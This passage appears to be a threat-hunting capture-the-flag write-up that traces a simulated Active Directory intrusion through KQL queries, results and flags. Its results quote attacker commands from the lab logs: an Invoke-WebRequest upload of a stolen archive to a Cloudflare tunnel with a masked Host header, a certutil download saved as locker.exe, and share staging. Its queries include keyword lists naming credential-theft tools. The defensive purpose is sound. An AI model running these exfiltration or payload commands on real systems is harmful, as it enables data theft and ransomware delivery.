**Approach**  The final question was a reasoning puzzle dressed as a contradiction. You went for the usual credential theft on the domain controller, the memory side is spotless, nothing read LSASS, and yet they walked away with every credential. The free hint gave the method for solving it, do not conclude there was no theft, conclude there was a quieter method, and reason from the absence to the technique. That is the core hunting discipline of treating a clean table as evidence rather than as an all clear.

The technique is DCSync, and the reason it leaves no memory trace is the whole point. Classic credential theft on a controller reads secrets out of the LSASS process in memory, which is exactly what endpoint sensors watch for and what would have lit up the memory side. DCSync never does that. It impersonates a domain controller and asks the real controller to replicate account secrets over the directory replication protocol, so the hashes are delivered from the directory database across the network as a legitimate sync. No process opens LSASS, no memory is read, and the only footprint is the replication request itself, which is why the earlier directory access burst from the backup account was the only trace at all.

So the answer pairs the technique with its consequence, DCSync, and the absence of a memory trace because it pulls the credentials over replication rather than reading process memory. The lesson that ties the whole hunt together is that the quietest techniques are defined by what they do not touch. The attacker avoided LSASS, avoided cracking the admin password, and avoided the directory audit gap on enumeration, and each silence was itself the clue. A hunter who only looks where the noise usually is would have called this controller clean.

**Results**  Reasoned from absence: no LSASS-access/memory-read tooling on DC, yet all creds taken; svc_backup 4662 replication burst proves DCSync, which retrieves secrets via DRSUAPI directory replication over the network instead of reading LSASS process memory

**Flag**  `DCSync. It pulls the hashes over the directory replication protocol, so nothing ever reads LSASS memory.`

> **Lesson:** Reason from absence to a quieter method. A spotless memory side with every credential gone points at DCSync, which pulls secrets over replication and never touches LSASS.

</details>

---

## ➡️ Phase 06 — Movement & Attribution

<details>
<summary><strong>Q21 — The Execution Method</strong> · <code>tool name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the remote-execution method behind the timestamped admin-share output.

**Briefing**  HUNT LEAD: "On the member server the commands ran remotely, and
the way the output got captured gives the toolkit away, dropped to
a hidden admin share in a file named with a timestamp. Name the
execution method."

Format: tool name

**Approach**  This question rewarded reading an artifact rather than naming a tool from memory. The lead said the commands ran remotely on the member server and that the way the output got captured gives the toolkit away, specifically that output was dropped to a hidden admin share in a file named with a timestamp. The free hint hammered the same discipline, match the artifact to the tool, do not guess.

The artifact is unmistakable once you see it. Every remotely run command on the file server and the backup server takes the form cmd.exe slash Q slash c, then the real command, then a redirect of standard output and error to a file at the address 127.0.0.1 ADMIN dollar, named with a double underscore followed by a unix timestamp with a fractional part. That output capture scheme, command wrapped in a quiet cmd and redirected to a timestamped file on the ADMIN share over the loopback address, is the signature of Impacket's wmiexec. The confirming detail is the parent process. Each of those cmd processes was spawned by wmiprvse.exe, the WMI Provider Host, because wmiexec executes by calling Win32 Process Create over WMI. Service based remote execution like psexec would show a service host and a dropped service binary, and a scheduled task approach would show the task engine, but WMI provider plus timestamped ADMIN share output is wmiexec and nothing else.

So the answer is wmiexec. The teaching point is that remote execution frameworks each leave a distinct output retrieval fingerprint, and you can fingerprint the tool from how it ferries results back without ever seeing the attacker's console. This same wmiexec session is what carried the collection and exfiltration on the file server and the backup destruction on the backup server, which makes the next question about execution context land, because the commands look like the admin but were born from a WMI host process. MITRE places this under Windows Management Instrumentation, T1047.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName has_any ("gf-srv01", "gf-bkp01")
| where TimeGenerated between (datetime(2026-06-11 22:00) .. datetime(2026-06-12 06:00))
| where ProcessCommandLine has "ADMIN$" or ProcessCommandLine has "127.0.0.1"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountName
| order by TimeGenerated asc
```

**Results**  gf-srv01/gf-bkp01: cmd.exe /Q /c <cmd> 1> \\127.0.0.1\ADMIN$\__<unix-timestamp.fraction> 2>&1 spawned by wmiprvse.exe - Impacket wmiexec.py fingerprint

**Flag**  `wmiexec`

> **Lesson:** Remote-execution frameworks each leave a distinct output-retrieval fingerprint. A quiet cmd redirecting to a timestamped file on the loopback ADMIN share, spawned by the WMI provider host, is wmiexec.

</details>

<details>
<summary><strong>Q22 — The Real Context</strong> · <code>the security context</code></summary>

<!-- derivation: inference -->

**Goal**  Name the security context that actually ran the remote commands.

**Briefing**  HUNT LEAD: "Don't take the logs at face value. The activity reads
as the Domain Admin, but the process that actually spawned those
commands ran as something else. What context really executed them.
This is the difference between who they impersonated and what ran
the work."

Format: the security context

**Approach**  This question is a warning against attribution by appearance. The lead said the activity reads as the Domain Admin but the process that actually spawned the commands ran as something else, and asked for the context that really executed the work. The distinction it draws is between who the attacker impersonated and what process lineage actually ran the commands.

The same wmiexec telemetry that solved the previous question answers this one if you read two columns instead of one. The account on every remotely executed command is d.williams, the domain admin whose hash was being passed, which is why the logs read as the admin. But the parent of every one of those cmd processes is wmiprvse.exe, the WMI Provider Host, and its account is not d.williams. The provider host runs as NT AUTHORITY NETWORK SERVICE. That is the machine local service identity that WMI uses to host provider work, and it is what actually launched the commands on the box. The attacker authenticated to WMI as the admin from the network, but the local execution was carried out by the provider host under its own service identity.

So the answer is NT AUTHORITY NETWORK SERVICE. The teaching value here is large for a defender. If you pivot or correlate only on the visible user, you attribute everything to d.williams and miss that the true on host execution vehicle was a WMI provider running as a service account. Spotting the network service parent under a domain admin command is itself the tell that this was remote WMI execution rather than an interactive admin session, which closes the loop with the tool identification. The lesson is to always separate the impersonated identity from the executing process identity, because they answer different questions during an investigation.

**Results**  All wmiexec commands on gf-srv01/gf-bkp01 ran as d.williams (impersonated DA) but were spawned by wmiprvse.exe whose InitiatingProcessAccountName = network service; WMI Provider Host executes under NT AUTHORITY\NETWORK SERVICE - the real execution context vs the impersonated DA

**Flag**  `NT AUTHORITY\NETWORK SERVICE`

> **Lesson:** Separate the impersonated identity from the executing process identity. The commands read as the domain admin, but the WMI provider host that launched them ran as NT AUTHORITY NETWORK SERVICE.

</details>

---

## 🎯 Phase 07 — Objective

<details>
<summary><strong>Q23 — The Collection</strong> · <code>three folder names, comma-separated</code></summary>

<!-- derivation: external -->

**Goal**  Name the three shares the attacker collected before destruction.

**Briefing**  HUNT LEAD: "They came for data before they came to destroy,
consolidating the company's shares ready to take. Name the three
they pulled."

Format: three folder names, comma-separated

**Approach**  This question shifted from how the attacker moved to what they actually wanted, and the lead stated the motive plainly. They came for data before they came to destroy, consolidating the company's shares ready to take, and asked for the three they pulled. That framing told me to look for a staging action, a single command that gathers multiple share paths into one place rather than scattered file reads.

The evidence was already sitting in the wmiexec session on the file server. Within a couple of minutes the operator ran a recursive directory listing across three specific share paths and then immediately compressed those same three paths into a single archive in a temp folder. The two commands name the same trio, the Finance share, the HR share, and the Projects share, gathered into one zip ready for exfiltration. The consistency between the enumeration and the compression is what makes this unambiguous, the attacker looked at exactly these three and then bagged exactly these three.

So the answer is Finance, HR, Projects. The teaching point is that collection has a recognizable shape, a burst of reads or a recursive listing followed by an archive operation into a staging directory, and the arguments to the archive command are effectively the attacker's own inventory of what they valued. From a defender's view, a Compress Archive or similar packaging step that pulls from multiple sensitive shares at once is a high signal collection event and a natural trigger for data loss alerting. This sets up the next two questions, because once the archive exists the story becomes where it went and how they kept a way back in. MITRE frames this as Data from Network Shared Drive, T1039, with archiving for staging under T1560.

**Results**  gf-srv01 wmiexec session (d.williams) 2026-06-12 00:49-00:51: dir C:\Shares\Finance C:\Shares\HR C:\Shares\Projects /s /b then Compress-Archive -Path C:\Shares\Finance,C:\Shares\HR,C:\Shares\Projects -DestinationPath C:\Windows\Temp\backup_archive.zip

**Flag**  `Finance, HR, Projects`

> **Lesson:** Collection has a recognizable shape. A recursive listing of several sensitive shares followed by an archive into a staging folder is the attacker inventorying exactly what they valued.

</details>

<details>
<summary><strong>Q24 — The Masked Destination</strong> · <code>hostname</code></summary>

<!-- derivation: inference -->

**Goal**  Recover the true exfiltration destination hidden behind the CDN edge.

**Briefing**  HUNT LEAD: "The archive left over an HTTPS tunnel, but they took a
step to hide where it was really going, the request points at a
CDN edge, not the true endpoint. Give me the destination they were
masking."

Format: hostname

**Approach**  This question tested whether you read the whole exfiltration command or just the obvious part. The lead said the archive left over an HTTPS tunnel but that they masked where it was really going, with the request pointing at a CDN edge rather than the true endpoint, and asked for the destination they were hiding. The free hint gave the exact tell, when the request line and the host header disagree, the header is the intent.

The exfiltration command on the file server uploaded the staged archive with a web request whose URL pointed at a trycloudflare.com address, which is a Cloudflare quick tunnel edge, the kind of throwaway front that looks like generic CDN traffic. But the same command set an explicit Host header to a different name entirely, cdn backup dot abordsecurity dot space. That is the real destination. The technique is domain fronting style masking, where the network sees a connection to a benign looking CDN edge while the host header steers the request to the operator's actual endpoint behind it. The free hint's closing detail confirmed the reading, the later retry attempts dropped the host header trick and just hit the tunnel directly, which is exactly what you would expect when the first masked attempt did not land and the operator got sloppy.

So the masked destination is cdn-backup.abordsecurity.space. The teaching point is that the URL in a request is not the same as its intent when a host header is present, and an investigator who pivots on the visible domain alone will chase a Cloudflare edge and miss the operator's infrastructure. The abordsecurity.space domain is the through line to attribution. MITRE covers this under Application Layer Protocol and the fronting and tunneling techniques in Command and Control.

**Results**  gf-srv01 exfil 2026-06-12 00:55: Invoke-WebRequest -Uri https://layout-load-medical-titans.trycloudflare.com/upload -InFile backup_archive.zip -Headers @{'Host'='cdn-backup.abordsecurity.space'} - request line shows Cloudflare CDN edge but Host header reveals the true masked endpoint; later retries dropped the header

**Flag**  `cdn-backup.abordsecurity.space`

> **Lesson:** A request line and its host header can disagree, and the header is the intent. The traffic pointed at a Cloudflare quick tunnel while the host header steered it to the operator's real endpoint.

</details>

<details>
<summary><strong>Q25 — The Fallback Access</strong> · <code>short phrase (why a legitimate RMM tool over custom malware)</code></summary>

<!-- derivation: external -->

**Goal**  Explain why a legitimate remote-access tool was chosen for the fallback.

**Briefing**  HUNT LEAD: "They didn't trust the tunnel to last, so they planted a
fallback way back in. You named the tool in triage. Tell me why
they reached for a legitimate remote-access product instead of
custom malware for that fallback."

Format: short phrase (why a legitimate RMM tool over custom malware)

**Approach**  This question moved from what happened to why, asking for the attacker's reasoning rather than an artifact. They did not trust the exfiltration tunnel to last, so they planted a fallback way back in, and the tool was already named in triage as AnyDesk. The question is why an operator at this level reaches for a legitimate remote access product instead of writing or deploying custom malware for that backup channel. The free hint pointed at two arenas to think in, the network and the detection stack.

The reasoning runs along both arenas at once. On the detection stack, AnyDesk is a signed, widely deployed, legitimate application, so endpoint antivirus and EDR do not carry a malicious signature for it and are far less likely to quarantine or alert on it than they would on a bespoke implant. It often sits on allow lists because real IT teams use it. On the network, its traffic flows to AnyDesk's own cloud relays over standard ports and looks like ordinary sanctioned remote support rather than a beacon to unknown attacker infrastructure. A custom tool has to solve both problems from scratch and still risks novelty based detection. So the fallback is durable and quiet precisely because it hides among legitimate use.

The accepted answer captured that a trusted signed tool blends in with normal traffic and evades the antivirus and EDR detection that custom malware would trigger. The teaching point is the modern living off trusted software trend, where adversaries deliberately choose commercial remote monitoring and management tools as resilient secondary access because the defender's own tooling is biased to treat them as benign. For a hunter the countermeasure is policy and baseline driven, flag remote access products that are not part of the sanctioned set and watch for their first appearance on a host, since the technique's whole strength is looking normal. MITRE tracks this as Remote Access Software, T1219.

**Results**  Fallback access was AnyDesk (Q02), a legitimate signed RMM product; chosen over custom malware because it is not flagged by AV/EDR and its traffic to AnyDesk cloud blends with sanctioned remote-support activity - durable low-signal C2

**Flag**  `A trusted signed tool blends in with normal traffic and evades the AV and EDR detection that custom malware would trigger.`

> **Lesson:** Adversaries increasingly live off trusted software. A signed commercial remote-access tool blends with normal traffic and evades the AV and EDR signatures a custom implant would trigger.

</details>

---

## 🌐 Phase 08 — Domain-Wide Weapon

<details>
<summary><strong>Q26 — The Delivery Mechanism</strong> · <code>the mechanism</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the native admin feature abused for domain-wide payload delivery.

**Briefing**  HUNT LEAD: "Now the part that turns one compromised server into a
domain-wide problem. They built a delivery mechanism from a native
admin feature to push their payload to every machine at once. What
did they abuse."

Format: the mechanism

**Approach**  This question marks the escalation from one server to the whole domain and asks what native feature the attacker turned into a mass delivery system. The lead described building a delivery mechanism to push a payload to every machine at once, which in a Windows domain points squarely at Group Policy. Group Policy is the legitimate administrative channel for applying settings, scripts, scheduled tasks, and software to every machine in scope, so an attacker who can author and link a policy owns a domain wide push capability without dropping a single custom agent.

The evidence is explicit in the operator's own commands. Using the same wmiexec channel as the rest of the intrusion, the admin account created a new Group Policy Object named to look benign, Greenfield Security Update with a comment of scheduled system update, and then linked it. The use of the GroupPolicy module cmdlets, New GPO followed by New GPLink, is the unmistakable signature of abusing Group Policy as the delivery mechanism. The disguise matters too, because a policy named like a routine patch rollout is unlikely to draw a second look from a busy administrator.

So the answer is Group Policy. The teaching point is that the most dangerous lateral movement at the end of a domain compromise often is not malware at all, it is the misuse of the directory's own management plane. Once you hold rights to create and link policy, you inherit the domain's built in fan out to every joined machine. For a defender this is why creation and linking of new GPOs, especially by unusual accounts or from unusual hosts, deserves the same scrutiny as a new service or scheduled task. The following questions drill into the blast radius of the link and a revealing failure that shows where this tooling actually lives. MITRE tracks this as Domain Policy Modification, Group Policy, T1484.001.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName startswith "gf-"
| where TimeGenerated between (datetime(2026-06-12 01:00) .. datetime(2026-06-12 06:00))
| where ProcessCommandLine has_any ("New-GPO","New-GPLink","Get-GPO","GroupPolicy","Install-WindowsFeature","Add-WindowsCapability","RSAT","GPMC","Import-Module","ServerManager","dism")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Results**  d.williams via wmiexec created and linked a GPO to deploy the payload domain-wide: New-GPO -Name 'Greenfield Security Update'; New-GPLink -Target dc=greenfield,dc=local -LinkEnabled Yes (gf-srv01 01:20 then gf-dc01 01:22)

**Flag**  `Group Policy`

> **Lesson:** The most dangerous lateral movement at the end of a domain compromise is often not malware. A new Group Policy Object inherits the domain's built-in fan-out to every joined machine.

</details>

<details>
<summary><strong>Q27 — The Scope</strong> · <code>the link target (a distinguished name or its description)</code></summary>

<!-- derivation: inference -->

**Goal**  Name the link target that gave the policy estate-wide scope.

**Briefing**  HUNT LEAD: "Scope is everything here. Where did they link that
policy so it would hit the entire estate."

Format: the link target (a distinguished name or its description)

**Approach**  Scope is the whole point of this question. Having established that the attacker abused Group Policy, the lead asked where they linked the policy so that it would hit the entire estate, and the free hint spelled out the principle, linked at the top, everything inherits it. In Active Directory a Group Policy Object does nothing until it is linked to a container, and the higher you link it the wider it applies. A link at a single organizational unit hits only that unit, but a link at the domain root applies to every account and machine that sits anywhere beneath it.

The operator's command answers it directly. The New GPLink call targeted the distinguished name dc equals greenfield comma dc equals local, which is the root of the domain itself, not a child organizational unit. By linking the malicious Greenfield Security Update policy at the domain root they guaranteed that every workstation and server in greenfield.local would pick it up on its next policy refresh. That is the maximum blast radius available through Group Policy short of touching multiple domains.

So the answer is the domain root, DC equals greenfield comma DC equals local. The teaching point is that the link target is the true measure of intent and impact for a GPO based attack, more so than the policy's contents, because the same payload linked at a leaf OU is a nuisance while linked at the root it is a domain wide detonation. For responders, a new link at the domain head is a five alarm event and the first thing to unlink during containment. The final question of this set examines a failure in their build process that reveals exactly where the Group Policy tooling lives.

**Results**  New-GPLink -GPO 'Greenfield Security Update' -Target 'dc=greenfield,dc=local' -LinkEnabled Yes (gf-dc01, d.williams) - linked at the domain root so every OU/machine in the estate inherits it

**Flag**  `DC=greenfield,DC=local`

> **Lesson:** The link target is the true measure of a GPO attack, more than its contents. Linked at the domain root, the policy reaches every machine in the estate.

</details>

<details>
<summary><strong>Q28 — The Tradecraft</strong> · <code>short phrase (what they installed / why the member server lacked it)</code></summary>

<!-- derivation: inference -->

**Goal**  Name what the attacker had to install on the DC and what it reveals.

**Briefing**  HUNT LEAD: "Their first attempt to build it failed on a member
server, so they provisioned something on the domain controller to
make it work. What did they have to install, and what does that
tell you about where this tooling lives."

Format: short phrase (what they installed / why the member server lacked it)

**Approach**  This question turned a failed command into an intelligence finding. The lead said the first attempt to build the policy failed on a member server, so the attacker provisioned something on the domain controller to make it work, and asked what they had to install and what that reveals about where the tooling lives. The method the free hint suggested is to read the working attempt against the failed one and let the difference speak.

The two attempts sit minutes apart. On the file server, a member server, the operator ran New GPO and New GPLink directly and it did not take. Moving to the domain controller, the very next command first ran Add Windows Feature for RSAT AD PowerShell with all sub features, then imported the ActiveDirectory and GroupPolicy modules, and only then issued the same New GPO and New GPLink. The added install step on the controller is the tell. The GroupPolicy and ActiveDirectory PowerShell modules are part of the Remote Server Administration Tools, which are present or trivially available on a domain controller but are not installed on an ordinary member server by default. That is why the member server attempt failed, the cmdlets simply were not there.

So the short answer is that they installed RSAT AD PowerShell, the AD and Group Policy management tooling, which lives on the domain controller and not on member servers by default. The teaching point is that an attacker's environment preparation is itself evidence. A sudden RSAT or feature install on a domain controller, immediately followed by directory and policy cmdlets, signals hands on keyboard abuse of the management plane rather than routine administration. For defenders, Add Windows Feature events on a domain controller deserve correlation with whatever ran next, because legitimate admins rarely install management tooling on the fly mid incident. MITRE relates this to the broader Domain Policy Modification activity the GPO abuse falls under.

**Results**  gf-srv01 New-GPO failed (no GroupPolicy module on member server); gf-dc01 01:22 d.williams ran Add-WindowsFeature RSAT-AD-PowerShell -IncludeAllSubFeature; Import-Module ActiveDirectory,GroupPolicy then New-GPO/New-GPLink succeeded - RSAT mgmt tooling lives on the DC, absent from member servers by default

**Flag**  `RSAT-AD-PowerShell, the AD and Group Policy management tooling, which lives on the domain controller not member servers.`

> **Lesson:** An attacker's environment preparation is itself evidence. A sudden RSAT feature install on a domain controller, then directory and policy cmdlets, shows where that tooling actually lives.

</details>

---

## 💥 Phase 09 — Impact Prep

<details>
<summary><strong>Q29 — The Recovery Attack</strong> · <code>short phrase (the objective of the command cluster)</code></summary>

<!-- derivation: external -->

**Goal**  State the purpose of the command cluster run before the locker dropped.

**Briefing**  HUNT LEAD: "On the backup server they ran a run of commands with
one purpose before staging the locker. Tell me what that purpose
was."

Format: short phrase (the objective of the command cluster)

**Approach**  The backup server was the last host the operator touched before dropping the encryptor, and the hunt lead asked for the single purpose behind the cluster of commands that ran there first. The verb is "what purpose," so the answer is an objective phrase, not a tool name. The campaign timeline already placed the recovery-inhibition activity on gf-bkp01 immediately ahead of the locker stage, so the hypothesis was that this cluster existed to remove the victim's ability to restore. The commands in that window all target recovery artifacts on the host, the shadow-copy store, the boot recovery configuration, and the backup catalog, and every one of them deletes or disables rather than reads. That pattern maps cleanly to MITRE T1490 Inhibit System Recovery, run just before T1485-style destruction, which is the textbook ransomware pre-stage so the encrypted data cannot simply be rolled back. The accepted phrase named the intent directly, to destroy the backups and prevent recovery, rather than listing the individual utilities. The teaching point is that a "purpose" question wants the objective the commands share, and when several different binaries all converge on deleting recovery state the shared objective is the answer, not any one command.

**Results**  Returned the value below.

**Flag**  `to destroy the backups and prevent recovery`

> **Lesson:** A purpose question wants the shared objective, not a tool list. When several different binaries all delete recovery state, the objective is to destroy the backups and prevent recovery.

</details>

<details>
<summary><strong>Q30 — The Disguise</strong> · <code>technique plus the saved path</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the disguise technique and where the real payload landed.

**Briefing**  HUNT LEAD: "The locker came down in disguise, pulled under the name
of a trusted Sysinternals tool. Name the technique behind the
disguise and where the real payload landed."

Format: technique plus the saved path

**Approach**  The final question asked for two linked facts, the technique that disguised the payload and the path where the real file came to rest. The format said technique plus the saved path, so this was a compound artifact answer, not prose, and the free hint pinned the tactic as Defense Evasion and told us the disguise lived in a name mismatch. The hypothesis was that the operator fetched the payload while dressing the request up as a known-good utility, so the right table was DeviceProcessEvents on gf-bkp01 filtered to download and transfer utilities across the incident window. A single command answered both halves at once. The certutil urlcache fetch pointed at the genuine Sysinternals distribution URL for PsExec, a trusted administrative tool, yet the bytes were written out to C:\Windows\Temp\locker.exe under a completely different name. That gap between what the download claims to be and what actually lands on disk is Masquerading, MITRE T1036, the Defense Evasion play of matching a legitimate name or source so the activity reads as routine admin work. The spawning pattern, cmd.exe quiet mode piping output to the local ADMIN dollar share with a unix-timestamp name, matched the wmiexec signature established earlier, so this download rode the same remote-execution channel as the rest of the hands-on-keyboard activity. The teaching point is that a well-formed compound question often resolves in one row when you pick the table that records both the claim and the result, here the process command line that carries both the disguised source URL and the true output path.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName contains "gf-bkp01"
| where ProcessCommandLine has_any ("Invoke-WebRequest","iwr ","curl","certutil","bitsadmin","DownloadFile","Start-BitsTransfer","wget")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**Results**  gf-bkp01 certutil -urlcache fetch references Sysinternals PsExec URL but writes file to C:\Windows\Temp\locker.exe; name/source mismatch = Masquerading T1036, Defense Evasion

**Flag**  `Masquerading, C:\Windows\Temp\locker.exe`

> **Lesson:** A well-formed compound question often resolves in one row from the right table. A certutil fetch claiming a Sysinternals tool but writing locker.exe is Masquerading caught in the command line.

</details>

---

## ⚖️ Phase 10 — Judgement

<details>
<summary><strong>Q31 — The Campaign Thread</strong> · <code>what the reuse proves, plus the host</code></summary>

<!-- derivation: run-query -->

**Goal**  Explain what the reused task name proves and which host runs the twin.

**Briefing**  HUNT LEAD: "The way-back task on the foothold box shares its name
with a task on a different host at the destructive end. Tell me
what that reuse tells you, and which host runs the twin."

Format: what the reuse proves, plus the host

**Approach**  This question hinged on a naming coincidence that is not a coincidence. The hunt lead said the way-back task on the foothold box shared its name with a task on a host at the destructive end, and asked what that reuse proves plus which host runs the twin. The way-back task was already known from the persistence phase, the GreenfieldUpdate scheduled task, so the query was simply to pull every process command line across the estate that referenced that task name and let the hosts fall out by time. Three rows told the whole story. On the foothold workstation the task was created early by the foothold user and ran a harmless whoami as SYSTEM, a test that the operator could plant a SYSTEM-level scheduled task at all. Hours later, on the backup server at the end of the intrusion, the same task name was created again by the impersonated domain admin, this time pointing at the staged payload and set to run as SYSTEM. Two different hosts, two different compromised accounts, one identical task name and one identical SYSTEM run-as pattern. That is what the reuse proves, a single operator working from one persistence playbook, and it ties the opening foothold directly to the closing destruction rather than leaving them as two unrelated events. Both creations are the same technique, scheduled task abuse for SYSTEM execution, MITRE T1053.005. The teaching point is that a repeated artifact name across hosts is an attribution thread. When the same custom string shows up in two places, query for the string itself and read the spread of hosts and accounts, because the reuse links phases of one campaign that might otherwise look separate.

**Query Used**
```kql
DeviceProcessEvents
| where ProcessCommandLine contains "GreenfieldUpdate"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**Results**  GreenfieldUpdate schtasks task created on gf-ws01 (p.singh, SYSTEM whoami) and gf-bkp01 (d.williams, SYSTEM payload); identical task name across two hosts/accounts = one operator persistence playbook; twin host gf-bkp01

**Flag**  `The same operator deployed both, reusing one scheduled task persistence playbook, which links the initial foothold to the destruction host. The twin runs on gf-bkp01.`

> **Lesson:** A repeated custom artifact name across hosts is an attribution thread. The same SYSTEM scheduled task on the foothold and the destruction host proves one operator working from one playbook.

</details>

<details>
<summary><strong>Q32 — The Persistence Model</strong> · <code>the persistence model</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the persistence model that held control without new accounts.

**Briefing**  HUNT LEAD: "Check whether they cut themselves new accounts or
escalated group memberships to hold their grip. They didn't. So
how were they keeping domain-wide control instead. Tell me the
persistence model."

Format: the persistence model

**Approach**  This was the hardest flag of the phase and the most instructive miss. The lead said the operator created no new accounts and escalated no groups, then asked how they kept domain wide control. The first move was to prove the negative the hint demanded. A count of security event IDs on the domain controller for the incident window showed a rich log, process creation, logons, special privileges, Kerberos, directory access, even scheduled task and service installs, but zero 4720 account creations and zero 4728, 4732 or 4756 group additions. So the negative was real, they truly created no identities. The trap was the obvious answer. With the krbtgt hash already pulled by DCSync, the textbook reply is a Golden Ticket, and four phrasings of that were all rejected. The rejection itself was the lesson. When several spellings of one concept all fail, it is a hypothesis miss, not a formatting miss, so stop reformatting and re read the hint for the discriminator. The discriminator was the phrase a credential they never had to create. A Golden Ticket is a forged credential, you create it, which is exactly what the hint excludes. The real model reused what already existed. Control came from two things already seen earlier in the hunt, the deployment mechanism, the domain linked Group Policy Object that re applies the payload to every machine, and the stolen valid domain admin credentials reused through Pass the Hash, an account they never had to create. Both are Defense Evasion techniques, Group Policy Modification and Valid Accounts, standing in for a Persistence technique, which is why the paid hint framed it as Defense Evasion against Persistence. The teaching point is that absence is a finding, and that an opaque grader rejecting every variant of your favorite answer is telling you the concept is wrong, not the wording.

**Query Used**
```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11) .. datetime(2026-06-13))
| where EventID == 4688
| where Computer has "gf-dc01"
| where CommandLine has_any ("ADMIN$","skeleton","sekurlsa","lsadump","Security Packages","Notification Packages","sdprop","AdminSDHolder","mimikatz","golden","Rubeus","dsacls","ntdsutil","Set-Acl","Add-ObjectAcl","DCShadow")
| project TimeGenerated, Account, NewProcessName, CommandLine
| order by TimeGenerated asc
```

**Results**  SilentCorridor SecurityEvent 2026-06-11/12 shows a rich DC log but ZERO 4720 account-creation and ZERO 4728/4732/4756 group-add events, so no new identities were cut. Domain-wide control was held by reusing what already existed, the domain-linked GPO Greenfield Security Update (Q26/Q27) that reapplies the payload across the estate and the stolen valid domain admin credential d.williams replayed through Pass-the-Hash (Q17/Q18). Both are Defense Evasion techniques, Group Policy Modification (T1484.001) and Valid Accounts (T1078), standing in for Persistence. A Golden Ticket was the rejected answer, because it is a forged credential you create and the hint excluded exactly that.

**Wrong attempts**
- `Golden Ticket` — Incorrect
- `Golden Ticket attack` — Incorrect
- `Kerberos Golden Ticket` — Incorrect
- `Golden Tickets` — Incorrect

**Flag**  `Malicious domain linked Group Policy deployed with reused valid domain admin credentials`

> **Lesson:** When an opaque grader rejects every variant of one answer, the concept is wrong, not the wording. Control here came from a reused valid admin credential and a domain-linked policy, not a forged ticket.

</details>

<details>
<summary><strong>Q33 — The Scope of the Trust</strong> · <code>verdict plus the host you checked</code></summary>

<!-- derivation: run-query -->

**Goal**  Give the verdict on the second domain and where you checked.

**Briefing**  HUNT LEAD: "There's a second domain across a trust, the natural
next move. Did they take it. Don't guess, tell me where you looked
to be sure."

Format: verdict plus the host you checked

**Approach**  The closing question tested whether the operator pushed past the domain they owned into a second domain reached over a trust, and it insisted on proof rather than a guess. The first task was simply to find the second domain. Profiling every host that logged to the workspace in the incident window surfaced four greenfield.local machines and one outlier, GF-DC02.corp.lognpacific.local, a domain controller in a different domain. That outlier is the second DC the trust connects to. With the target identified the work was a footprint search on that one host. I asked three things of GF-DC02. Did any compromised account, d.williams, svc_backup, sancadmin or p.singh, ever authenticate there. Did the pivot address 10.1.0.120 ever reach it. Did the wmiexec ADMIN dollar redirect signature, the operator's hands on execution pattern everywhere else, ever appear. All three returned nothing. The only cross realm activity was the two domain controllers' own machine accounts authenticating to each other a handful of times, which is the ordinary heartbeat of a healthy trust and is present whether or not anyone attacks it. So the verdict is no, the attacker never crossed the trust, and the place I looked to be sure is GF-DC02.corp.lognpacific.local. The teaching point is that a trust is an opportunity, not evidence of use, and that absence is a legitimate finding when you can name exactly where you searched and show the attacker's known signatures are missing from it.

**Query Used**
```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11) .. datetime(2026-06-13))
| where Computer == "GF-DC02.corp.lognpacific.local"
| where Account has "greenfield" or TargetAccount has "greenfield" or SubjectAccount has "greenfield"
| summarize count() by EventID, Account
| order by count_ desc
```

**Results**  GF-DC02.corp.lognpacific.local checked across incident window: zero compromised-account logons (d.williams/svc_backup/sancadmin/p.singh), zero pivot 10.1.0.120, zero wmiexec ADMIN$ exec; only baseline GREENFIELD.LOCAL\GF-DC01$ trust traffic (3 logons). Attacker never crossed the trust.

**Flag**  `No. I checked GF-DC02.corp.lognpacific.local and found no attacker footprints.`

> **Lesson:** A trust is an opportunity, not evidence of use. Absence is a legitimate finding when you can name the host you checked and show the attacker's known signatures are missing.

</details>

---

## 🧩 Phase 11 — Capstone

<details>
<summary><strong>Q34 — Reconstruct the Climb</strong> · <code>four steps in order, comma-separated (e.g. Kerberoast, offline crack, DCSync, Pass-the-Hash)</code></summary>

<!-- derivation: briefing -->

**Goal**  List the four moves that took the attacker from foothold to Domain Admin.

**Briefing**  HUNT LEAD: "Pull it together. In order, the four moves that took
them from a no-privilege foothold user to operating as Domain
Admin. The chain, not a list of events."

Format: four steps in order, comma-separated (e.g. Kerberoast, offline crack, DCSync, Pass-the-Hash)

**Approach**  The final flag was a synthesis, not a new investigation. It asked for the four moves in order that carried the operator from a no privilege foothold user to operating as Domain Admin, and the free hint was explicit that it wanted a causal chain where each step produced the thing that made the next possible. Every link was already an accepted flag earlier in the hunt, so the work was assembling them in dependency order rather than querying. Step one was Kerberoast, requesting the service ticket for the service account svc_backup, which the domain issued under weak RC4 encryption. That ticket was the input to step two, offline cracking, which recovered svc_backup's plaintext password away from the network where no lockout or alert applied. Those credentials were the input to step three, DCSync, because svc_backup happened to hold the directory replication right, so the operator could ask the domain controller to hand over the password hashes for every account including the domain admin d.williams and the krbtgt key. The domain admin hash was the input to step four, Pass the Hash, reusing that hash directly to authenticate as d.williams without ever knowing the password, which is the moment they were operating as Domain Admin. The chain is Kerberoast, offline crack, DCSync, Pass the Hash. The teaching point is that a chain question is testing whether you understand causation, not chronology, and the test of a correct chain is the hint's own rule, that you can explain why each step was only possible because of the one before it.

**Results**  Synthesis of accepted flags: Kerberoast svc_backup RC4 TGS -> offline crack (Q13/Q14) -> DCSync via svc_backup replication rights pulling d.williams DA + krbtgt (Q16/Q19) -> Pass-the-Hash d.williams DA hash (Q18). Each step output enabled the next.

**Flag**  `Kerberoast, offline crack, DCSync, Pass-the-Hash`

